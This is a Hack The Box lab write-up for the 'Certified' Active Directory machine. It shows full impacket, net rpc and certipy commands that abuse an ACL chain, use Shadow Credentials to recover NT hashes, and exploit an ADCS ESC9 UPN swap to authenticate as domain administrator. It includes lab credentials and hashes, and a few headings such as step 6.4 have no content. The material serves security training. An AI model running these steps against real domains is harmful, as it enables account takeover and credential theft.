# HTB Certified

> **Platform:** Hack The Box
> **OS:** Windows (Active Directory)
> **Domain:** `certified.htb` — DC: `DC01` (`10.129.77.71`)
> **Difficulty:** Medium
> **Assumed-breach start:** credentials `judith.mader : judith09` are provided.

## Attack Path Overview

1. **Recon** – standard Domain Controller services.
2. **BloodHound (as `judith.mader`)** – maps an ACL chain: `judith` → **WriteOwner** on the `Management` group → the group has **GenericWrite** over `management_svc` → `management_svc` has **GenericAll** over `ca_operator`.
3. **Abuse the ACL chain** – take ownership of `Management`, add `judith`, then Shadow-Credentials each account down the chain to recover NT hashes for `management_svc` and `ca_operator`.
4. **ADCS ESC9** – the `CertifiedAuthentication` template has `NoSecurityExtension` (no SID embedded in the issued cert). Using `management_svc`'s GenericAll over `ca_operator`, swap `ca_operator`'s UPN to `administrator`, enroll, then authenticate as the Domain Admin.

Starting credentials:

```
10.129.77.71
DC01.certified.htb
Username: judith.mader
Password: judith09
```

## 5. Abusing the ACL Chain → NT hashes

### Step 5.1 — Own and join the `Management` group

`judith` has `WriteOwner` over the `Management` group. Take ownership (remember: `-new-owner`, **not** `-owner`):

```bash
impacket-owneredit -action write -new-owner 'JUDITH.MADER' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
```

```
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
...
[*] OwnerSid modified successfully!
```

> ⚠️ **Mistake caught in the log:** the first attempt used `-owner` and errored with `unrecognized arguments`. The flag is `-new-owner`.

Now grant yourself `WriteMembers` on the group via a DACL edit:

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

```
[*] DACL backed up to dacledit-20261029-152404.bak
[*] DACL modified successfully!
```

Add `judith` to the group and verify:

```bash
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.77.71"
net rpc group members "MANAGEMENT" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.77.71"
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ net rpc group members "MANAGEMENT" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.77.71"
CERTIFIED\judith.mader
```

### Step 5.2 — Shadow Credentials → `management_svc` hash

`Management` has `GenericWrite` over `management_svc`, and `judith` is now in `Management`. That is enough to write `management_svc`'s `msDS-KeyCredentialLink`:

```bash
certipy-ad shadow auto -u 'judith.mader'@certified.htb -p 'judith09' -account 'MANAGEMENT_SVC'
```

```
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

> ⚠️ **Clock skew:** the first few attempts failed with `KRB_AP_ERR_SKEW(Clock skew too great)` and returned `NT hash: None`. Syncing to the DC fixed it (see the note at the end). The `DNS resolution failed` warning is harmless because `/etc/hosts` resolves the host.

### Step 5.3 — Shadow Credentials → `ca_operator` hash

`management_svc` has `GenericAll` over `ca_operator`, so repeat the attack one step down the chain (authenticating with the hash this time):

```bash
certipy-ad shadow auto -u 'MANAGEMENT_SVC'@'certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account 'CA_OPERATOR'
```

```
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

**Harvested hashes:**


**ESC9** = the template carries the `NoSecurityExtension` flag, so the issued certificate does **not** embed the requester's object SID. Without a SID binding, the KDC maps the cert purely by the **UPN**. Because `management_svc` has `GenericAll` over `ca_operator`, we can temporarily set `ca_operator`'s UPN to `administrator`, enrol on its behalf, then revert — producing a certificate that authenticates as the Domain Admin.

### Step 6.2 — (Optional) read the victim's current UPN (for restoration)

```bash
certipy-ad account \
    -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.129.77.71' -user 'ca_operator' read
```

```
[*] Reading attributes for 'ca_operator':
    sAMAccountName                      : ca_operator
    userPrincipalName                   : ca_operator@certified.htb
```

### Step 6.3 — Set `ca_operator`'s UPN to the target admin

```bash
certipy-ad account \
    -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.129.77.71' -upn 'administrator@certified.htb' \
    -user 'ca_operator' update
```

```
[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator@certified.htb
[*] Successfully updated 'ca_operator'
```

> ⚠️ **Ordering gotcha (learned the hard way in the log):** if you request the certificate *before* changing the UPN, the cert comes back with UPN `ca_operator@certified.htb` and authenticating as `administrator` fails with a **name mismatch**. Set the UPN **first**, then request. Also set the UPN to the full `administrator@certified.htb` (an early attempt used just `administrator`, which caused the cert/username mismatch). And use the **correct** hash for `management_svc` (`a091...`) — using `ca_operator`'s hash here gives `invalidCredentials`.

### Step 6.4 — Request the certificate as `ca_operator`

## Appendix — Fixing `KRB_AP_ERR_SKEW (Clock skew too great)`

This box has a ~7-hour skew, which breaks every Kerberos step (`GetUserSPNs`, `certipy shadow`, `certipy auth`). The reliable fix is to **disable the auto-NTP sync** (otherwise it keeps dragging your clock back to real time) and then hard-set the clock to the DC:

```bash
sudo timedatectl set-ntp off
sudo ntpdate -u 10.129.77.71
```

If you leave `set-ntp true`, `ntpdate` succeeds but `systemd-timesyncd` immediately re-syncs to the real time, and the next certipy command fails again — exactly the retry loop seen in the raw log.

## Lessons Learned

- **Not every Kerberoastable account cracks.** `management_svc` had an SPN but its password wasn't in rockyou — don't get stuck; BloodHound showed a cleaner ACL path.
- **`-vulnerable` can hide templates** when your current user lacks rights. Dump all templates with `-text` and grep the `Enrollment Rights` yourself to find which non-admin principal can enrol.
- **Chaining Shadow Credentials** down an ACL path (`WriteOwner → group → GenericWrite → GenericAll`) is the core AD-ACL pattern — each hop recovers the next account's NT hash.
- **ESC9 depends on UPN mapping.** With `NoSecurityExtension`, the cert has no SID, so the KDC trusts the UPN. Whoever can write a victim's UPN can mint a certificate for any account — set UPN **before** requesting, use the full `name@domain`, and restore it afterward.
- **Clock skew is the silent killer** on AD boxes; `set-ntp off` + `ntpdate -u <DC>` before Kerberos work.
